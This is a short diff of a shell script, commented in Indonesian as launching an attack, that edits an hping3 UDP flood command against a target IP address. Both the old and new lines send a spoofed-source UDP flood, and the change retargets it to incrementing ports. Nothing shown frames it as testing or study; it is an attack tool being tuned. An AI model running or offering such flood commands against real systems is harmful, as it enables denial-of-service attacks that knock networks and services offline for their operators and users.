@@ -38,4 +38,4 @@ fi
 
 # Jalankan serangan
 echo "Memulai UDP flood..."
-hping3 --udp --flood --rand-source --rand-dest "$TARGET_IP"
+hping3 --udp --flood --rand-source -p ++1 "$TARGET_IP"
